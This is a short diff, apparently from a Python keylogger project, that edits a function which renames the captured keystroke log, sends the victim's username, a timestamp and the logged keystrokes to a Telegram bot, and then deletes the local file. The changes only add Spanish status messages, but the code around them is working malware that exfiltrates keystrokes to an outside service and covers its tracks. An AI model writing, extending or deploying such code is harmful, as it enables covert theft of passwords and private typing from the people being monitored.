@@ -366,6 +366,7 @@ def SendLog():
         #print("[DataBase]=> "+str(exito))
     def TelegramBot():
         try:
+            print("[TelegramBot] Proceso...")
             pathO = logKeyPath()+ LogName()
             pathN = logKeyPath()+ random_char(20)+".txt"
             os.rename(pathO, pathN)
@@ -377,13 +378,14 @@ def SendLog():
                 bot = telebot.TeleBot(Token())      # Instancia
                 bot.send_message(ID(),"Usuario: "+str(getuser())+"\nFecha: "+currentTime+"\nRegistro de teclas:")  
                 bot.send_message(ID(),f.read())   #
+                print("[TelegramBot] Se obtuvo el registro de teclas y se subió a Telegram")
                 f.close()
                 os.remove(pathN)
+                print("[TelegramBot] Se eliminó el archivo caché correctamente")
             except:
                 print("[Telegram] Error al subir los datos")
         except:
             try:
-                pass
                 f.close()
                 os.remove(pathN)  # Borra la carpeta por posible Errores
             except:
